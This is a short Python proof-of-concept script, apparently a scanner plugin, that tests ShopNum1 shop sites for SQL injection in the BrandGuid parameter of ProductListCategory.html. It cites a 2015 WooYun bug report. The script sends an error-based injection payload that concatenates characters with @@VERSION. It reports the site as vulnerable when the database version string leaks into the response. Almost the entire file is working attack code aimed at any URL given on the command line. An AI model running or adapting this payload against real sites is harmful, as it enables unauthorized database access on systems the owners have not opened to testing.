#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shopnum1 ProductListCategory SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0118352
author: Lucifer
description: 文件ProductListCategory.html中,参数BrandGuid存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['shopnum1 ProductListCategory SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ProductListCategory.html?BrandGuid=ac69ddd9-3900-43b0-939b-3b1d438ca190%27AnD(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsiOn)%3E0--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
